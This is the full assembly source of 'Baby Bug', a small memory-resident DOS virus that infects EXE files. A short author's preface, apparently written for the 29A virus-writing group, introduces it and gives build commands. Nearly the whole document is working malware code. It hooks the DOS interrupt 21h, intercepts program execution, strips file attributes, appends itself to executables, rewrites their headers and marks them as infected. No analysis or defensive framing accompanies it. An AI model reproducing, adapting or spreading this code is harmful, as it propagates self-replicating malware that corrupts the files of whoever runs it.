;
;                                                  млллллм млллллм млллллм
;          Baby Bug                                ллл ллл ллл ллл ллл ллл
;          by Tcp/29A                               мммллп плллллл ллллллл
;                                                  лллмммм ммммллл ллл ллл
;                                                  ллллллл ллллллп ллл ллл
;
; Because in 29A#2 it wasn't going to be published any virus originally wri-
; tten by me and i did not like that, taking advantage of a little last-hour
; delay in the release of the magazine and of a rainy afternoon i decided to
; code this little virus. It is a 407 byte-long TSR EXE infector, which uses
; a pretty unusual code in order to process the EXE header... and this code,
; as you may imagine, takes less bytes than the standard one :)
;
;
; Compiling it
; ФФФФФФФФФФФФ
; tasm /m babybug.asm
; tlink babybyg.obj


                .286
                baby    segment
                assume  cs:baby, ds:baby, es:baby, ss:baby
                org     0

VIRUS_SIZE      =       end_virus - start
VIRUS_MEM_SIZE  =       memsize - start
VIR_PARAG       =       (VIRUS_MEM_SIZE + 15) / 16 + 1

start:
delta_ofs       equ     word ptr $+1
                mov     si,0                    ; mov si,delta_ofs
                push    ds
                push    es
                mov     ax,ds
                add     ax,10h
                add     cs:[si+f_relocs],ax     ; Relocate host CS & SS
                add     cs:[si+f_reloss],ax
                mov     ax,0BAB1h               ; Resident check
                int     21h
                cmp     ax,0BA03h               ; Already resident?
                je      exec_host               ; Yes? then jmp
                mov     ax,ds
                dec     ax
                mov     ds,ax
                mov     bx,ds:[0003]
                sub     bx,VIR_PARAG+1
                mov     ah,4Ah
                int     21h                     ; Adjust current block
                mov     ah,48h
                mov     bx,VIR_PARAG
                int     21h                     ; Get memory
                mov     es,ax
                push    cs
                pop     ds
                xor     di,di
                mov     cx,VIRUS_SIZE
                rep     movsb                   ; Copy virus to allocated mem
                push    es
                push    offset(mem_copy)
                retf

                db      '[Baby Bug, Tcp/29A]'

mem_copy:
                push    cs
                pop     ds
                dec     ax
                mov     es,ax
                mov     word ptr es:[0001],8    ; DOS MCB
                mov     ax,3521h                ; Read int 21h
                int     21h
                mov     [di],bx                 ; Store it
                mov     [di+2],es
                mov     dx,offset(vir_21h)      ; Virus int 21h
                mov     ah,25h
                int     21h
exec_host:
                pop     es
                pop     ds
                cli
                db      68h                     ; push f_reloss
f_reloss        dw      0FFF0h
                pop     ss
f_exesp         equ     word ptr $+1
                mov     sp,offset(memsize)      ; mov sp,f_exesp
                sti
                db      0EAh                    ; jmp host entry point
f_exeip         dw      0
f_relocs        dw      0FFF0h

vir_21h:
                cmp     ax,0BAB1h               ; Resident check?
                jne     check_exec              ; No? then jmp
int_24h:
                mov     al,3
                iret

check_exec:
                cmp     ax,4B00h                ; Exec file?
                je      process_file            ; Yes? then jmp
                jmp     jmp_real_21

process_file:
                pusha
                push    ds
                push    es
                mov     ax,3524h
                int     21h                     ; Read int 24h
                push    es
                push    bx
                mov     ah,25h
                push    ax
                push    ds
                push    dx
                push    cs
                pop     ds
                mov     dx,offset(int_24h)
                int     21h                     ; Set virus int 24h
                pop     dx
                pop     ds
                mov     ax,4300h
                push    ax
                int     21h                     ; Read file attributes
                pop     ax
                inc     ax
                push    ax
                push    cx
                push    ds
                push    dx
                xor     cx,cx
                int     21h                     ; Reset file attributes
                jnc     open_file
jmp_r_attr:
                jmp     restore_attr
open_file:
                mov     ax,3D02h
                int     21h                     ; Open file I/O
                jc      jmp_r_attr
                xchg    ax,bx
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     ax,5700h
                int     21h                     ; Get file date/time
                push    ax
                push    cx
                push    dx
                mov     ah,3Fh
                mov     dx,offset(file_header)
                mov     cx,18h
                int     21h                     ; Read file header
                mov     si,dx
                stc
                lodsw                           ; Signature
                cmp     ax,'MZ'                 ; EXE?
                je      infect_exe              ; Yes? then jmp
                cmp     ax,'ZM'                 ; EXE?
                jne     jmp_r_datetime          ; Yes? then jmp
infect_exe:
                lodsw                           ; Part page
                xchg    ax,bp
                lodsw                           ; Number of 512 bytes pages
                or      bp,bp
                jz      no_sub_page
                dec     ax
no_sub_page:
                mov     cx,512
                mul     cx
                add     ax,bp                   ; Calculate file size
                adc     dx,0
                push    ax                      ; Save it
                push    dx
                lodsw                           ; Relocation items
                lodsw                           ; Header size
                xchg    ax,bp
                lodsw                           ; Min. memory
                lodsw                           ; Max. memory
                mov     di,offset(f_reloss)
                movsw                           ; SS
                scasw                           ; DI+2
                movsw                           ; SP
                scasw                           ; DI+2
                lodsw                           ; checksum
                movsw                           ; IP
                xchg    ax,dx
                lodsw                           ; CS
                stosw
                cmp     ax,dx                   ; checksum == CS? infected?
                pop     dx
                pop     ax
                je      restore_datetime        ; Yes? ten jmp
                push    bp
                push    ax
                push    dx
                mov     ax,4202h
                xor     cx,cx
                cwd
                int     21h                     ; Lseek end of file
                pop     cx
                pop     bp
                cmp     ax,bp                   ; Overlays?
                pop     bp
jmp_r_datetime:
                jne     restore_datetime        ; Yes? then jmp
                cmp     dx,cx                   ; Overlays?
                jne     restore_datetime        ; Yes? then jmp
                push    ax
                push    dx
                mov     cx,16                   ; Calculate virus CS, IP
                div     cx
                sub     ax,bp
                std
                mov     di,si
                scasw
                stosw                           ; CS
                xchg    ax,dx
                stosw                           ; IP
                mov     delta_ofs,ax
                xchg    ax,dx
                stosw                           ; Checksum = CS (infection mark)
                xchg    ax,dx
                mov     ax,VIR_PARAG*16         ; SP
                stosw
                xchg    ax,dx
                stosw                           ; SS
                cmpsw           ; hey! SUB DI,8 is only 3 bytes long, but it
                cmpsw           ;  doesn't roq... :)
                cmpsw
                cmpsw
                pop     dx
                pop     ax
                add     ax,VIRUS_SIZE           ; Calculate number of pages
                adc     dx,0
                mov     cx,512
                div     cx
                or      dx,dx
                jz      no_inc_pag
                inc     ax
no_inc_pag:
                stosw                           ; Number of pages
                xchg    ax,dx
                stosw                           ; Bytes in last page
                mov     ah,40h
                cwd
                mov     cx,VIRUS_SIZE
                int     21h                     ; Append virus body to file
                jc      restore_datetime
                mov     ax,4200h
                mov     cx,dx
                int     21h                     ; Lseek begin of file
                mov     ah,40h
                mov     dx,di
                mov     cx,18h
                int     21h                     ; Write new header to file
restore_datetime:
                pop     dx
                pop     cx
                pop     ax
                inc     ax                      ; 5701h
                int     21h                     ; Restore date & time
                mov     ah,3Eh
                int     21h                     ; Close file
restore_attr:
                pop     dx
                pop     ds
                pop     cx
                pop     ax
                int     21h                     ; Restore attributes
                pop     ax
                pop     dx
                pop     ds
                int     21h                     ; Restore int 24h
                pop     es
                pop     ds
                popa
jmp_real_21:
                db      0EAh                    ; jmp to int 21h
end_virus:
ofs_i21         dw      ?
seg_i21         dw      ?

file_header:
signature       dw      ?
part_page       dw      ?
pages           dw      ?
relo_items      dw      ?
hdrsize         dw      ?
mim_mem         dw      ?
max_mem         dw      ?
reloss          dw      ?
exesp           dw      ?
checksum        dw      ?
exeip           dw      ?
relocs          dw      ?

memsize:

baby    ends
        end     start

; Baby Bug, by Tcp/29A
; (c) 1997, Tcp/29A (tcp@cryogen.com)
